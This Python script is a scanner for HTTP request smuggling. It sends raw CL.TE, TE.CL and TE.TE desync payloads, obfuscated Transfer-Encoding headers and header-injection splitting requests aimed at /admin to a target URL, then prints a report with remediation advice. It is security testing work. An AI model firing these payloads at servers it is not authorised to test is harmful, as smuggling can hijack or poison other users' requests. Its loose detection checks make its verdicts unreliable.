#!/usr/bin/env python3
"""
HTTP Request Smuggling Analyzer
Tests for HTTP Request Smuggling vulnerabilities (CL.TE, TE.CL, TE.TE)

Installation:
    pip install requests

Usage:
    python http_smuggling_analyzer.py <target_url>
    
Example:
    python http_smuggling_analyzer.py https://example.com
    python http_smuggling_analyzer.py https://example.com/api
    
Description:
    Detects HTTP Request Smuggling vulnerabilities by testing:
    - CL.TE (Content-Length vs Transfer-Encoding)
    - TE.CL (Transfer-Encoding vs Content-Length)
    - TE.TE (Dual Transfer-Encoding)
    - Header normalization issues
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse

class HTTPSmugglingAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.port = 443 if self.parsed_url.scheme == 'https' else 80
        self.use_ssl = self.parsed_url.scheme == 'https'
        self.path = self.parsed_url.path or '/'
        self.vulnerabilities = []
    
    def analyze_all(self):
        print(f"[*] Analyzing HTTP Request Smuggling on: {self.target_url}\n")
        print(f"[*] Target: {self.host}:{self.port}")
        print(f"[*] SSL: {self.use_ssl}\n")
        
        self._test_cl_te_smuggling()
        self._test_te_cl_smuggling()
        self._test_te_te_smuggling()
        self._test_header_normalization()
        self._test_chunked_encoding_variants()
        self._test_request_splitting()
        
        return self.vulnerabilities
    
    def _send_raw_request(self, request_data, timeout=10):
        """Send raw HTTP request and return response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.sendall(request_data.encode('utf-8'))
            
            response = b""
            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        except Exception as e:
            return None
    
    def _test_cl_te_smuggling(self):
        """Test CL.TE (Content-Length vs Transfer-Encoding) smuggling"""
        print("[*] Testing CL.TE (Content-Length priority)...")
        
        # Classic CL.TE payload
        smuggled_request = "GET /404 HTTP/1.1\r\nHost: " + self.host + "\r\n\r\n"
        
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: {len(smuggled_request)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )
        
        response1 = self._send_raw_request(request)
        
        if response1:
            # Send normal request to see if smuggled request affects it
            time.sleep(0.5)
            normal_request = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            response2 = self._send_raw_request(normal_request)
            
            if response2 and '404' in response2:
                self.vulnerabilities.append({
                    'type': 'CL.TE Request Smuggling',
                    'severity': 'CRITICAL',
                    'description': 'Front-end uses Content-Length, back-end uses Transfer-Encoding',
                    'impact': 'Attacker can smuggle requests to poison cache or hijack sessions',
                    'detection': 'Smuggled 404 request affected subsequent request'
                })
                print(f"    [!] CRITICAL: CL.TE smuggling detected!")
            else:
                print(f"    [+] CL.TE smuggling not detected")
        else:
            print(f"    [!] Connection failed")
    
    def _test_te_cl_smuggling(self):
        """Test TE.CL (Transfer-Encoding vs Content-Length) smuggling"""
        print("[*] Testing TE.CL (Transfer-Encoding priority)...")
        
        # TE.CL payload - front-end sees chunked, back-end sees Content-Length
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GET /404 HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response1 = self._send_raw_request(request)
        
        if response1:
            time.sleep(0.5)
            normal_request = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            response2 = self._send_raw_request(normal_request)
            
            if response2 and '404' in response2:
                self.vulnerabilities.append({
                    'type': 'TE.CL Request Smuggling',
                    'severity': 'CRITICAL',
                    'description': 'Front-end uses Transfer-Encoding, back-end uses Content-Length',
                    'impact': 'Attacker can smuggle requests through transfer encoding',
                    'detection': 'Smuggled request affected subsequent response'
                })
                print(f"    [!] CRITICAL: TE.CL smuggling detected!")
            else:
                print(f"    [+] TE.CL smuggling not detected")
        else:
            print(f"    [!] Connection failed")
    
    def _test_te_te_smuggling(self):
        """Test TE.TE (Dual Transfer-Encoding) smuggling"""
        print("[*] Testing TE.TE (Dual Transfer-Encoding)...")
        
        # Test with obfuscated Transfer-Encoding headers
        obfuscations = [
            ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
            ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked "),
            ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
            ("Transfer-Encoding: chunked", "Transfer-Encoding: xchunked"),
            ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        ]
        
        for te1, te2 in obfuscations:
            request = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"{te1}\r\n"
                f"{te2}\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"GET /404 HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"\r\n"
            )
            
            response = self._send_raw_request(request, timeout=5)
            
            if response and '404' in response:
                self.vulnerabilities.append({
                    'type': 'TE.TE Request Smuggling',
                    'severity': 'CRITICAL',
                    'description': 'Servers disagree on which Transfer-Encoding header to use',
                    'obfuscation_1': te1,
                    'obfuscation_2': te2,
                    'impact': 'Attacker can exploit header parsing differences'
                })
                print(f"    [!] CRITICAL: TE.TE smuggling with obfuscation detected!")
                return
        
        print(f"    [+] TE.TE smuggling not detected")
    
    def _test_header_normalization(self):
        """Test header normalization issues"""
        print("[*] Testing header normalization...")
        
        # Test with unusual header formatting
        normalization_tests = [
            ("Content-Length", "Content-Length "),  # Trailing space
            ("Content-Length", "Content-Length\t"),  # Tab
            ("Content-Length", " Content-Length"),  # Leading space
            ("Transfer-Encoding", "Transfer-Encoding "),
            ("Transfer-Encoding", "Transfer-encoding"),  # Case variation
        ]
        
        issues_found = []
        
        for correct, variant in normalization_tests:
            request = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"{variant}: test\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            
            response = self._send_raw_request(request, timeout=5)
            
            if response and ('200' in response or '400' not in response):
                issues_found.append(variant)
        
        if issues_found:
            self.vulnerabilities.append({
                'type': 'Header Normalization Issues',
                'severity': 'MEDIUM',
                'description': 'Server accepts unusual header formatting',
                'variants_accepted': issues_found,
                'impact': 'May indicate parsing inconsistencies exploitable for smuggling'
            })
            print(f"    [!] MEDIUM: Header normalization issues found")
        else:
            print(f"    [+] No header normalization issues")
    
    def _test_chunked_encoding_variants(self):
        """Test various chunked encoding variations"""
        print("[*] Testing chunked encoding variants...")
        
        # Test different chunk size notations
        chunk_variants = [
            "5\r\nhello\r\n0\r\n\r\n",  # Normal
            "5;\r\nhello\r\n0\r\n\r\n",  # Semicolon after size
            "5 \r\nhello\r\n0\r\n\r\n",  # Space after size
            "05\r\nhello\r\n0\r\n\r\n",  # Leading zero
            "0x5\r\nhello\r\n0\r\n\r\n",  # Hex prefix
        ]
        
        accepted_variants = []
        
        for variant in chunk_variants:
            request = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{variant}"
            )
            
            response = self._send_raw_request(request, timeout=5)
            
            if response and '200' in response:
                accepted_variants.append(variant.split('\r\n')[0])
        
        if len(accepted_variants) > 1:
            self.vulnerabilities.append({
                'type': 'Chunked Encoding Variants',
                'severity': 'MEDIUM',
                'description': 'Server accepts multiple chunk size notations',
                'accepted_variants': accepted_variants,
                'impact': 'Parsing differences may enable smuggling attacks'
            })
            print(f"    [!] MEDIUM: Multiple chunked variants accepted")
        else:
            print(f"    [+] Standard chunked encoding only")
    
    def _test_request_splitting(self):
        """Test HTTP request splitting via headers"""
        print("[*] Testing HTTP request splitting...")
        
        # Try to inject a new request via header
        split_payloads = [
            f"test\r\n\r\nGET /admin HTTP/1.1\r\nHost: {self.host}\r\n\r\n",
            f"test\nGET /admin HTTP/1.1\nHost: {self.host}\n\n",
            f"test\r\nX-Ignore: \r\nGET /admin HTTP/1.1\r\n",
        ]
        
        for payload in split_payloads:
            request = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"X-Custom-Header: {payload}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            
            response = self._send_raw_request(request, timeout=5)
            
            if response and response.count('HTTP/') > 1:
                self.vulnerabilities.append({
                    'type': 'HTTP Request Splitting',
                    'severity': 'HIGH',
                    'description': 'Multiple HTTP responses in single connection',
                    'payload': payload[:50],
                    'impact': 'Request splitting may lead to cache poisoning'
                })
                print(f"    [!] HIGH: Request splitting detected!")
                return
        
        print(f"    [+] Request splitting not detected")
    
    def _test_timing_based_detection(self):
        """Use timing to detect smuggling"""
        print("[*] Testing timing-based detection...")
        
        # Send request that should delay if smuggling works
        delay_request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 100\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"\r\n"
        )
        
        start = time.time()
        response = self._send_raw_request(delay_request, timeout=15)
        elapsed = time.time() - start
        
        # If response takes longer than expected, might indicate smuggling
        if elapsed > 10:
            self.vulnerabilities.append({
                'type': 'Timing Anomaly',
                'severity': 'LOW',
                'description': f'Request took {elapsed:.2f}s - may indicate smuggling',
                'elapsed_time': f'{elapsed:.2f}s',
                'impact': 'Timing suggests potential desync between front/back-end'
            })
            print(f"    [!] LOW: Timing anomaly detected ({elapsed:.2f}s)")
        else:
            print(f"    [+] Normal timing behavior")
    
    def print_report(self):
        print("\n" + "="*70)
        print("HTTP REQUEST SMUGGLING ANALYSIS REPORT")
        print("="*70 + "\n")
        
        if not self.vulnerabilities:
            print("[+] No HTTP Request Smuggling vulnerabilities detected!")
            print("[+] Server appears to handle HTTP parsing consistently.")
            return
        
        print(f"[!] Found {len(self.vulnerabilities)} potential smuggling issues:\n")
        
        # Group by severity
        critical = [v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v.get('severity') == 'HIGH']
        medium = [v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']
        low = [v for v in self.vulnerabilities if v.get('severity') == 'LOW']
        
        for severity, vulns in [('CRITICAL', critical), ('HIGH', high), ('MEDIUM', medium), ('LOW', low)]:
            if vulns:
                print(f"\n{severity} Severity ({len(vulns)}):")
                print("-" * 50)
                for i, vuln in enumerate(vulns, 1):
                    print(f"\n  [{i}] {vuln['type']}")
                    for key, value in vuln.items():
                        if key not in ['type', 'severity']:
                            if isinstance(value, list):
                                print(f"      {key}:")
                                for item in value:
                                    print(f"        - {item}")
                            else:
                                print(f"      {key}: {value}")
        
        print("\n" + "="*70)
        print("REMEDIATION RECOMMENDATIONS")
        print("="*70)
        print("""
1. Use HTTP/2 end-to-end (not vulnerable to smuggling)
2. Disable back-end connection reuse
3. Normalize ambiguous requests (reject if CL and TE both present)
4. Use same web server software for front-end and back-end
5. Validate Content-Length and Transfer-Encoding headers strictly
6. Reject requests with multiple Content-Length headers
7. Reject requests with both Content-Length and Transfer-Encoding
8. Implement strict HTTP parsing with no tolerance for ambiguity
        """)

def main():
    if len(sys.argv) < 2:
        print("HTTP Request Smuggling Analyzer")
        print("=" * 50)
        print("\nUsage: python http_smuggling_analyzer.py <target_url>")
        print("\nExamples:")
        print("  python http_smuggling_analyzer.py https://example.com")
        print("  python http_smuggling_analyzer.py https://example.com/api")
        print("\nDescription:")
        print("  Tests for HTTP Request Smuggling vulnerabilities:")
        print("  - CL.TE (Content-Length vs Transfer-Encoding)")
        print("  - TE.CL (Transfer-Encoding vs Content-Length)")
        print("  - TE.TE (Dual Transfer-Encoding)")
        print("  - Header normalization issues")
        print("  - Request splitting")
        print("\nWARNING:")
        print("  This tool sends malformed HTTP requests that may:")
        print("  - Trigger security alerts")
        print("  - Affect other users if smuggling exists")
        print("  - Only use on systems you have permission to test!")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print("\n" + "="*70)
    print("HTTP REQUEST SMUGGLING ANALYZER")
    print("="*70 + "\n")
    
    print("[!] WARNING: This tool sends malformed HTTP requests")
    print("[!] Only use on systems you have permission to test!\n")
    
    analyzer = HTTPSmugglingAnalyzer(target)
    analyzer.analyze_all()
    analyzer.print_report()
    
    print("\n" + "="*70)
    print("Analysis Complete")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()